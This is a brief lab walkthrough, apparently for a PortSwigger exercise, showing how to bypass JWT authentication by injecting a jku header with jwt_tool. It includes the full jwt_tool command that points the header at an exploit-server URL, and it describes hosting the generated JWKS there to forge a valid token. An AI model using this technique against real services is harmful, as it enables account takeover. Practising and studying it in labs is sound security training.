# JWT authentication bypass via jku header injection

We will be using jwt_tool

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image.png)

Get the exploit server URL and use it in the jwt_tool

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%201.png)

```xml
python3 jwt_tool.py eyJraWQiOiJhOWQ1ZDliYi1hN2Y4LTQ3OTItYWU5NC1kYzAwOGI3YjFmYTIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ4NDg5Niwic3ViIjoid2llbmVyIn0.d_eBM787hxXAba6d4hkrofreAgkcF38lctX5qkbtGocLQi2QsaVuLFEdijj7p5ZTNO6Dk0r-GO3RtCoOlkmaUywR_YdhplDT_Ld_WxPDrcULuceTvzxqjawGUowbgzvfpmTbhYc5QHcFtBeFHdK_xMJFxFdt0ir-VVw0I0KaWbPV_8Ayy31iKfKW6_k0MwUjrn9N1J7jcM0T6nrCVYvrD54layEPVmFzCs_zkwjo3vKX_5yL1ixz5oX2YOnPjoEgsu6DnNaXAudoYs3wuDzyyZrzAT0qA4WD8NFP2hHnyIccuar0Ea8Iu5CQDxuWIaDIuinHViN_AYwGbXfYyioUFA -X s -ju https://exploit-0a0200f00391ef128256c30a015400dd.exploit-server.net/exploit -T
```

Always make sure kid is jwt_tool, otherwise it won’t work

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%202.png)

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%203.png)

```xml
cat /home/cmok/.jwt_tool/jwttool_custom_jwks.json
```

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%204.png)

Host this on the exploit server

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%205.png)

And use the token

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%206.png)

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%207.png)

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%208.png)

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%209.png)

![image.png](JWT%20authentication%20bypass%20via%20jku%20header%20injection/image%2010.png)